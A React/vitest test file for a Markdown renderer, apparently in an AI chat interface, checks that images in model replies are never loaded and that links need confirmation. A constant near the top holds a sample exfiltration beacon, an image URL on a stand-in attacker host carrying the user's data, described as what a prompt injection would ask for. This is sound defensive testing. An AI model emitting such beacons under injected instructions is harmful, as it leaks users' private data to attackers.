import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import { Markdown } from "./Markdown.tsx";

afterEach(cleanup);

/** What a prompt injection would ask for: a picture whose address carries the person's data. */
const BEACON = "https://evil.example/p.gif?d=inbox%20secret";

describe("Markdown", () => {
  it.each([false, true])("never loads an image from a reply (streaming: %s)", (streaming) => {
    const { container } = render(
      <Markdown streaming={streaming}>{`Here is your summary.\n\n![chart](${BEACON})\n\nDone.`}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector('link[rel="preload"]')).toBeNull();
    expect(screen.getByText(/\[Image not loaded: chart\]/)).toBeTruthy();
    // The address is shown, and opens only through link safety's confirmation.
    const link = screen.getByText(BEACON);
    fireEvent.click(link);
    expect(screen.getByText("Open external link?")).toBeTruthy();
  });

  it("does not load data images or images inside links either", () => {
    const { container } = render(
      <Markdown>
        {
          "![dot](data:image/png;base64,iVBORw0KGgo=) and [![badge](https://img.example/b.svg)](https://example.com/page)"
        }
      </Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText(/\[Image not loaded: dot\]/)).toBeTruthy();
    expect(screen.getByText(/\[Image not loaded: badge\]/)).toBeTruthy();
    // No address shown for the data image, and no link nested in the outer one.
    expect(container.textContent).not.toContain("data:image");
    expect(container.querySelectorAll("a a")).toHaveLength(0);
  });

  it("still renders ordinary markdown and links", () => {
    const { container } = render(
      <Markdown>{"Two things need you. See [the page](https://example.com/a)."}</Markdown>,
    );
    expect(container.textContent).toContain("Two things need you.");
    fireEvent.click(screen.getByText("the page"));
    expect(screen.getByText("Open external link?")).toBeTruthy();
  });

  it("moves headings down to start at a given level, so a README adds no second h1", () => {
    const { container } = render(
      <Markdown headingsFrom={3}>{"# Title\n\n## Part\n\n###### Deep\n\nText."}</Markdown>,
    );
    expect(container.querySelector("h1")).toBeNull();
    expect(container.querySelector("h3")?.textContent).toBe("Title");
    expect(container.querySelector("h4")?.textContent).toBe("Part");
    expect(container.querySelector("h6")?.textContent).toBe("Deep");
    const plain = render(<Markdown>{"# Title"}</Markdown>);
    expect(plain.container.querySelector("h1")?.textContent).toBe("Title");
  });
});
